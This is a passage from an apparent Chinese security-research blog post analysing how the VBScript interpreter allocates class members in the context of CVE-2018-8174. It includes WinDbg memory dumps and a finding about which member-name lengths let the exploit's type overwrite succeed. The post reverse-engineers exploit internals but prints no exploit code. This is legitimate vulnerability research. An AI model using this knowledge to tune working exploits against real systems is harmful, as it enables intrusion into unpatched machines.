<p>&#x9006;&#x5411;Vbscript&#x6A21;&#x5757;&#xFF0C;&#x7ECF;&#x8FC7;&#x5927;&#x4F6C;&#x6307;&#x70B9;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x901A;&#x8FC7;vbscript!CScriptRuntime::RunNoEH&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x8C03;&#x7528;&#xFF0C;&#x6700;&#x7EC8;&#x5728;vbscript!NameList::FCreateVval&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x8FDB;&#x884C;&#x5206;&#x914D;&#x3002;</p>
<p><img src="/2019/08/13/20190813-1/4.png" alt="img"></p>
<p><img src="/2019/08/13/20190813-1/5.png" alt="img"></p>
<p>&#x9006;&#x5411;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5361;&#x5DF4;&#x65AF;&#x57FA;&#x5206;&#x6790;&#x4E2D;&#x516C;&#x5F0F;&#x7684;&#x6765;&#x6E90;&#xFF0C;&#x604D;&#x7136;&#x5927;&#x609F;&#x3002;windbg&#x4E2D;&#x8C03;&#x8BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;&#x524D;&#x6210;&#x5458;&#x540D;&#x4E3A;SPP,&#x957F;&#x5EA6;&#x4E3A;3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd ebp+8</span><br><span class="line">01fbcd60  01fbcdc0 01fbcda0 00000000 00000000   //01fbcdc0&#x4E3A;&#x7B2C;&#x4E00;&#x53C2;&#x6570; &#x5373;SYM*</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 01fbcdc0 </span><br><span class="line">01fbcdc0  0031fa20 00000003 000089b3 00000001</span><br><span class="line">    </span><br><span class="line">0:005&gt; du 0031fa20  //&#x5F53;&#x524D;&#x6210;&#x5458;&#x540D;</span><br><span class="line">0031fa20  &quot;SPP&quot;</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 01fbcdc0 +4</span><br><span class="line">01fbcdc4  00000003 000089b3 00000001 01fbcdec  //&#x5F53;&#x524D;&#x6210;&#x5458;&#x5B57;&#x7B26;&#x6570;&#x4E3A;3</span><br><span class="line">01fbcdd4  69241738 6929a4f8 0000004a 0031004c</span><br><span class="line">01fbcde4  0031eac0 0031ecf0 01fbce04 0031ecf0</span><br></pre></td></tr></table></figure>

<p>&#x4E5F;&#x5373;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5728;8174&#x7684;&#x5229;&#x7528;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x968F;&#x610F;&#x8BBE;&#x7F6E;setprop_a&#x7C7B;&#x6210;&#x5458;&#x540D;&#x548C;class_fun_a&#x6210;&#x5458;&#x540D;&#xFF0C;&#x4F7F;&#x5F97;&#x5176;&#x5BF9;&#x8C61;&#x603B;&#x5927;&#x5C0F;&#x504F;&#x79FB;&#x4E0D;&#x7B49;&#x4E8E;0xc&#xFF0C;&#x90A3;&#x4E48;&#x7C7B;&#x578B;&#x8986;&#x76D6;&#x4F1A;&#x51FA;&#x9519;&#xFF0C;&#x5373;&#x4E0D;&#x80FD;&#x6210;&#x529F;&#x5229;&#x7528;&#x3002;&#x6D4B;&#x8BD5;&#x540E;&#xFF0C;&#x679C;&#x771F;&#x5982;&#x6B64;&#x3002;</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
      <div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
  
  <!-- JS库 sweetalert 可修改路径 -->
  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  <p><span>本文标题:</span><a href="/2019/08/13/20190813-1/">从cve-2018-8174到VBScript解释器的内部结构</a></p>
  <p><span>文章作者:</span><a href="/" title="访问 Saturn35 的个人博客">Saturn35</a></p>
  <p><span>发布时间:</span>2019年08月13日 - 17:22</p>
  <p><span>最后更新:</span>2019年12月28日 - 13:22</p>
  <p><span>原始链接:</span><a href="/2019/08/13/20190813-1/" title="从cve-2018-8174到VBScript解释器的内部结构">https://saturn35.github.io/2019/08/13/20190813-1/</a>
    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://saturn35.github.io/2019/08/13/20190813-1/" aria-label="复制成功！"></i></span>
  </p>
  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
</div>
<script> 
    var clipboard = new Clipboard('.fa-clipboard');
    $(".fa-clipboard").click(function(){
      clipboard.on('success', function(){
        swal({   
          title: "",   
          text: '复制成功',
          icon: "success", 
          showConfirmButton: true
          });
    });
    });  
</script>

      
      </div>
      
      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/08/12/20190812-1/" rel="next" title="CVE-2018-8174：从UAF到任意地址读写">
                <i class="fa fa-chevron-left"></i> CVE-2018-8174：从UAF到任意地址读写
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/08/13/20190813-2/" rel="prev" title="[07] HEVD 内核漏洞之任意内存覆盖">
                [07] HEVD 内核漏洞之任意内存覆盖 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  




        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="Saturn35">
            
              <p class="site-author-name" itemprop="name">Saturn35</p>
              <p class="site-description motion-element" itemprop="description">心诚求之，虽不中，不远矣。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Saturn35" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:huity35@outlook.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/Saturn35_Huity" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://passport.kanxue.com/user-center-831334.htm" target="_blank" title="kanxue">
                      
                        <i class="fa fa-fw fa-book"></i>kanxue</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-概念"><span class="nav-number">2.</span> <span class="nav-text">0x01 概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-8174的p-code代码及分析"><span class="nav-number">3.</span> <span class="nav-text">0x02 8174的p-code代码及分析</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Saturn35</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">98.2k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: true,
        appId: '1fB9JY8xOQdkT8o7B5JMLEK4-MdYXbMMI',
        appKey: 'I5Me1NOQdPHTJgK0ELfVmocG',
        placeholder: 'Comment here...',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  

  

  
  

  

  

  


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<script type="text/javascript" src="/js/src/click_show_text.js"></script>

<script type="text/javascript" src="/js/src/FunnyTitle.js"></script>